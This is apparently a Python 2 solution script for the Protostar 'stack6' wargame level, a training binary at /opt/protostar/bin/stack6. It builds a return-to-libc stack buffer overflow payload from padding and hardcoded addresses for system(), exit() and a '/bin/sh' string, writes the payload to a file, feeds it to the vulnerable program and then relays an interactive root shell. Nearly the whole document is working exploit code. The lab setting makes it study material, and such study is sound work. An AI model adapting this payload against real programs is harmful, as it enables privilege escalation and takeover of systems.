from subprocess import PIPE, Popen
from time import sleep
import os.path
import sys
import struct



# ============================= make_exploit =============================
def make_exploit():
    """This is our BOF input"""

    padding = b'AAAA'*20
    ret = struct.pack('I', 0xb7ecffb0) # return to system() at (0xb7e97000 + 0x00038fb0)
    return_after_system = struct.pack('I', 0xb7ec60c0) # exit() at 0xb7ec60c0
    bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

    exploit = (padding + ret + return_after_system + bin_sh)
    return exploit


# ============================= print_exploit =============================
def print_exploit(exploit):
    """Prints a representation of the exploit input"""

    cont = 0
    sys.stdout.write('='*20 + 'Exploit' + '='*20 + '\n')
    while cont < len(exploit):
        sys.stdout.write('{0:<8}: '.format(hex(cont) ))
        sys.stdout.write(' '.join( [x for x in exploit[cont:cont+16]] ) + '\n')
        cont += 0x10
    sys.stdout.write('='*47 + '\n\n')


# ============================= save_exploit =============================
def save_exploit(exploit_filename, exploit, _print=False):
    """Saves exploit input data to a file at the same directory of this script (__file__)"""

    if _print:
        print('\n[X] Saving: {0}...\n'.format(exploit_filename))
        print_exploit(exploit)

    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'wb') as exploit_file:
        exploit_file.write(exploit)


# ============================= evil =============================
def evil(exploit_filename, level_path):
    """call level_path and run the exploit"""

    print('\n[X] Exploiting: {0}\n'.format(level_path))

    cli = level_path
    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'rb') as exploit_file:
        process = Popen(cli, shell=True, stdin=PIPE)
        process.stdin.write(exploit_file.read() + '\n')
    
    sleep(0.1)
    print('[X] Executing /bin/sh as root\n')
    while True:
        sleep(0.001)
        try:
            input_data = raw_input('> ')
            process.stdin.write(input_data + '\n')
        except KeyboardInterrupt:
            print("< KeyboardInterrupt")
            break
    process.kill()
    return process.returncode


# ============================= S T A R T =============================
if __name__ == '__main__':
    exploit_filename = 'exploit_stack6'
    level_path = '/opt/protostar/bin/stack6'
    try:
        if sys.argv[1] == '-s' or sys.argv[1] == '--save':
            exploit = make_exploit()
            save_exploit(exploit_filename, exploit, True)
        else:
            print('Error: bad option.\
            \n\n\trun:\n\t{0} [-s | --save]\    # to save exploit file\n'.format(sys.argv[0]))

            print('\tor just run: \n\t{0}    # to exploit `{1}`\n'.format(sys.argv[0], level_path))
    except:
        exploit = make_exploit()
        save_exploit(exploit_filename, exploit, True)
        evil(exploit_filename, level_path)

